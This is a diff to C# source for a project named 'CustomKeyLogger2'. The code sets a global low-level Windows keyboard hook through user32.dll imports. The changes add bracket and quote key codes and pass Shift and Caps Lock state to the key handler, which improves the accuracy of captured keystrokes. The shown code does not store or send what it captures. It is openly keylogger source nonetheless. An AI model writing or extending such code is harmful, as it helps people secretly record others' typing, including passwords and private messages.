@@ -1,10 +1,10 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-
 using System.Diagnostics;
+using System.Linq;
 using System.Runtime.InteropServices;
+using System.Text;
+using System.Windows.Forms;
 
 namespace CustomKeyLogger2
 {
@@ -15,7 +15,6 @@ namespace CustomKeyLogger2
 
         private static class API
         {
-
             //dll imports for hooking and unhooking and sending events trough hook hierarchy
 
             [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
@@ -34,17 +33,15 @@ namespace CustomKeyLogger2
             public static extern IntPtr CallNextHookEx(
                 IntPtr hhk,
                 int nCode,
-                IntPtr
-                wParam,
+                IntPtr wParam,
                 IntPtr lParam);
 
             [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
             public static extern IntPtr GetModuleHandle(
                 string lpModuleName);
 
-            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-            public static extern IntPtr GetKeyState(
-                IntPtr virtualKeyCode);
+            [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
+            internal static extern short GetKeyState(int virtualKeyCode);
         }
 
         public enum VK
@@ -169,6 +166,10 @@ namespace CustomKeyLogger2
             VK_OEM_PERIOD = 0xBE,   // '.' / '>'
             VK_OEM_2 = 0xBF,        // '/' / '?'
             VK_OEM_3 = 0xC0,        // '`' / '~'
+            VK_OEM_4 = 0xDB,        // '[' / '{'
+            VK_OEM_5 = 0xDC,        // '\' / '|'
+            VK_OEM_6 = 0xDD,        // ']' / '}'
+            VK_OEM_7 = 0xDE,        // _'_ / _"_
 
             VK_PLAY = 0XFA,
             VK_ZOOM = 0XFB
@@ -182,7 +183,9 @@ namespace CustomKeyLogger2
 
         public delegate void KeyHandler(
             IntPtr wParam,
-            IntPtr lParam);
+            IntPtr lParam,
+            bool ShiftMod,
+            bool CapMod);
 
         private static IntPtr hhk = IntPtr.Zero;
         private static HookDel hd;
@@ -221,8 +224,15 @@ namespace CustomKeyLogger2
             int iwParam = wParam.ToInt32();
             //depending on what you want to detect you can either detect keypressed or keyrealased also with  a bit tweaking keyclicked.
             if (nCode >= 0 && (iwParam == 0x100 || iwParam == 0x104)) //0x100 = WM_KEYDOWN, 0x104 = WM_SYSKEYDOWN
-                kh(wParam, lParam);
- 
+            {
+                bool ShiftMod = false;
+                if (Control.ModifierKeys == Keys.Shift) ShiftMod = true;
+                bool CapMod = false;
+                String CapKeyState = helper.ToBinary(API.GetKeyState((int)VK.VK_CAPITAL));
+                if (CapKeyState == "1") CapMod = true;
+                kh(wParam, lParam, ShiftMod, CapMod);
+            }
+             
             return API.CallNextHookEx(hhk, nCode, wParam, lParam);
         }
     }
